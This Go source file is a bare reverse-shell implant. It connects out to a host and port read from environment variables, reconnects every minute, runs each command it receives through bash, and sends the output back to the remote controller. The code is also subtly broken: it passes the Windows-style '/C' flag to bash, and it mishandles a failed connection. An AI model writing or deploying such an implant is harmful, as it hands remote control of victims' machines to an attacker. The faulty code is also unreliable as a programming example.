package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
)

var (
	Host = os.Getenv("HOST")
	Port = os.Getenv("Port")
)

func main() {
	reverse(fmt.Sprintf("%s:%s", Host, Port))
}

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			c.Close()
			reverse(host)
			return
		}

		cmd := exec.Command("/bin/bash", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}
